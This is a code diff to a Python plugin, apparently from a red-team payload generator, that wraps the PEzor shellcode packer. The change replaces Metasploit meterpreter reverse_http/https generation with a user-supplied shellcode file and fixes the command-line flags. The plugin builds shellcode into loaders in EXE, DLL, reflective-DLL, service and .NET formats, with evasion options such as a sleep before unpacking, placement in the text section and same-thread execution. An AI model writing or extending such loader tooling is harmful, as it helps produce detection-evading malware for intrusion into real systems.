@@ -5,20 +5,19 @@ import subprocess
 import uuid
 import base64
 from libs.options import Option
+from libs.types import PayloadType
 
 NAME = 'pezor'
 DESC = '使用clang编译，支持导出 exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke'
+TYPE = PayloadType.SHELLCODE_PACKER
 OPTIONS = [
-    Option(name='module', name_tag='payload', type='enum', required=True, desc='所使用的msf payload', enum_list=[
-        'payload/windows/meterpreter/reverse_http',
-        'payload/windows/meterpreter/reverse_https',
-    ]),
-    Option(name='arch', name_tag='位数', type='enum', required=False, desc='系统位数', default='32', enum_list=['32', '64']),
+    Option(name='shellcode', name_tag='Shellcode文件', type='file', required=True, desc='所使用的msf payload shellcode'),
+    Option(name='arch', name_tag='位数', type='enum', required=False, desc='系统位数', default='32', enums=['32', '64']),
     Option(name='debug', name_tag='debug版本', type='bool', desc='生成debug版本', required=False, default=False),
     Option(name='text', name_tag='text节', type='bool', desc='把shellcdoe放置到text节而不是data节', required=False, default=False),
     Option(name='self', name_tag='同线程', type='bool', desc='在相同的线程里面运行shellcode', required=False, default=False),
     Option(name='sleep', name_tag='休眠时间', type='integer', desc='在解压shellcode前休眠多少秒', required=False),
-    Option(name='format', name_tag='生成格式', type='enum', desc='输出特定格式', required=False, default='exe', enum_list=['exe', 'dll', 'reflective-dll', 'service-exe', 'service-dll', 'dotnet', 'dotnet-createsection','dotnet-pinvoke']),
+    Option(name='format', name_tag='生成格式', type='enum', desc='输出特定格式', required=False, default='exe', enums=['exe', 'dll', 'reflective-dll', 'service-exe', 'service-dll', 'dotnet', 'dotnet-createsection','dotnet-pinvoke']),
 ]
 REFERENCES = ['https://github.com/phra/PEzor']
 AUTHOR = 'Akkuman <akkumans@qq.com>'
@@ -38,20 +37,7 @@ def run(options=None, info=None):
         res = b''
 
         # 从msf生成shellcode
-        from libs.pymetasploit.jsonrpc import MsfJsonRpc
-        msfjsonrpc = MsfJsonRpc(
-            server=settings.MSFCONFIG['HOST'],
-            port=settings.MSFCONFIG['JSONRPC']['PORT'],
-            token=settings.MSFCONFIG['JSONRPC']['TOKEN'],
-        )
-        payload = msfjsonrpc.modules.use('payload', options.get('module'))
-        payload['Format'] = 'raw'
-        for k, v in info.items():
-            payload[k] = v
-        if payload.missing_required:
-            raise exceptions.ValidationError(detail={'参数缺失': payload.missing_required})
-        data = payload.payload_generate()
-        bin_data = base64.b64decode(data)
+        bin_data = base64.b64decode(options.get('shellcode'))
         
         # 保存shellcode到文件
         uid = str(uuid.uuid4())
@@ -81,11 +67,11 @@ def _build_cmd(options, src):
     if options.get('arch'):
         cmds.append(f"-{options.get('arch')}")
     if options.get('debug'):
-        cmds.append(f"-{options.get('debug')}")
+        cmds.append(f"-debug")
     if options.get('text'):
-        cmds.append(f"-{options.get('text')}")
+        cmds.append(f"-text")
     if options.get('self'):
-        cmds.append(f"-{options.get('self')}")
+        cmds.append(f"-self")
     if options.get('sleep'):
         cmds.append(f"-sleep={options.get('sleep')}")
     if options.get('format'):
